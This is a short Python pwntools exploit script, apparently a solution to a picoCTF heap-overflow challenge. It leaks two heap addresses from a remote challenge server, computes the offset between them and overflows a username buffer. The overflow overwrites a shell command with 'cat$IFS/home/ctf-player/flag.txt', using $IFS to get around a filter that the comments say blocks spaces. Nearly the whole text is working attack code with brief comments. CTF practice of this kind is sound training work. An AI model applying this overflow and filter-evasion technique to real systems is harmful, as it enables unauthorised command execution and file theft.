#because this is malloc behaviour which is the behaviour itself is uninitiliazed meaning it will save cache in memory

from pwn import *

elf = context.binary = ELF('./vuln')
#ly = process()
ly = remote('amiable-citadel.picoctf.net', 62665) #remote

#leak 1: username address. Catch with script
ly.recvuntil('username at ')
leak_1 = int(ly.recvline().strip(), 16) #catch and change to int
log.success('leak_1: %#x', leak_1) #print if the leak success

#leak 2: shell address. Catch with script. Same as leak_1
ly.recvuntil('shell at ')
leak_2 = int(ly.recvline().strip(), 16) 
log.success('leak_2: %#x', leak_2)

#after you leak it, you can try to count to be offset for your payload to get flag
total = leak_2 - leak_1
log.success('result: %#x', total) #print the result

payload = flat(
    'A'*total,
    'cat$IFS/home/ctf-player/flag.txt' #change to cat$IFS/home/ctf-player/flag.txt because if you try cat flag.txt -> it didn't work assume that they blacklist ' '
    # so change it to be $IFS
)

ly.sendlineafter('username: ', payload)
ly.interactive()